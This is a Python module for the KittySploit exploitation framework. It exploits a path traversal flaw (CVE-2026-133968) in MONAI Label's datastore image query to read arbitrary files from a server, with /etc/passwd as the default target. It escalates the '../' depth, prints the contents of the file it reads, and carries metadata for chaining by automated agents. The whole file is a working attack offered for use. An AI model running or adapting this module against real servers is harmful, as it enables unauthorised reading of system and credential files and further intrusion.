#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-133968 — MONAI Label arbitrary file read."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.monai_label import Monai_label


class Module(Auxiliary, Http_client, Monai_label):
    __info__ = {
        "name": "MONAI Label CVE-2026-133968 traversal read",
        "description": "Reads file via ../ in datastore/image query.",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-133968"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-133968"],
        "tags": ["monai", "file-read", "cve-2026-133968", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["file_read"],
            "chain": {
                "suggested_followups": ["scanner/http/monai_label_cve_2026_133968_detect"],
            },
        },
    }

    port = OptPort(8000, "MONAI Label HTTP port", required=False)
    read_path = OptString("etc/passwd", "Relative path to read", required=False)
    traversal_depth = OptPort(8, "Max ../ depth", required=False, advanced=True)

    def run(self):
        target = str(self.read_path or "etc/passwd")
        depth = int(getattr(self, "traversal_depth", 8) or 8)
        if hasattr(depth, "value"):
            depth = depth.value
        res = self.monai_traverse_read(target, max_depth=depth)
        if not res:
            print_error("Traversal read failed")
            return False
        print_success(f"Read at depth {res['depth']} via {res['payload']}")
        print_status(res["body"][:600])
        self.set_info(severity="critical", cve="CVE-2026-133968", **res)
        return True